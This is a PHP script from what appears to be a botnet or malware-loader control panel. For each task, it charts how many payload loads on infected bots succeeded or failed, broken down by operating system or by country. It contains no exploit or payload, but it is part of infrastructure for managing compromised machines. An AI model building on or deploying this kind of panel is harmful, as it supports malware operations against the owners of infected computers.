<?
	include_once "../common.php";
	if( !$user->Check() ) exit;

	include_once ROOT_PATH."/mod/functs.php";
	include_once ROOT_PATH."/mod/geo.php";		

	$tid   = (int)$_GET['tid'];
	$status = ($_GET['status'] == 'good') ? 3 : 2;
	$data   = array();
	$legend = array();

	switch ($_GET['by']) {
		case 'os':
			$sql = "SELECT LEFT(bots_t.os_version_bot, 3) val, count(loads_t.upId) num FROM bots_t, loads_t 
				WHERE bots_t.id_bot = loads_t.fk_bot_id AND loads_t.fk_task_id = '$tid' AND loads_t.upStatus = '$status'
				GROUP BY val";
			break;
		case 'country':
			$sql = "SELECT country_t.name_country val, count(loads_t.upId) num FROM loads_t, bots_t, city_t, country_t 
				WHERE bots_t.id_bot = loads_t.fk_bot_id AND bots_t.fk_city_bot = city_t.id_city AND city_t.fk_country_city =
				country_t.id_country  AND loads_t.fk_task_id = '$tid' AND loads_t.upStatus='$status' 
				GROUP BY country_t.id_country  ORDER BY num DESC LIMIT 0, ".$db->config('stat_country_num');
			break;
	}

	$res = $db->query($sql);
	
	if( $db->affected_rows > 0 ) while ($mres = $res->fetch_array()) 
	{
		$data[]   = $mres['num'];
		
		if ($_GET['by'] == 'os') 
		{
			$legend[] = get_os($mres['val']);
		} else {
			$legend[] = CountryCode($mres['val']);
		}
	}
	if (!count($data)) 
	{
		$data[]   = 0;
		$legend[] = 'None';
	}

	$title = ($_GET['status'] == 'good') ? 'Good' : 'Fail';

	
	
	require_once ROOT_PATH.'/plugins/ofc/php-ofc-library/open-flash-chart.php';
	$g = new graph();
	$g->pie(60,'#505050','{font-size: 12px; color: #404040;');
	$g->pie_values( $data, $legend );
	$g->pie_slice_colours( array('#d01f3c','#356aa0','#C79810') );
	$g->set_tool_tip('#x_label# - #val#');
	$g->title($title, '{font-size:18px; color: #d01f3c}');
	echo $g->render();
?>
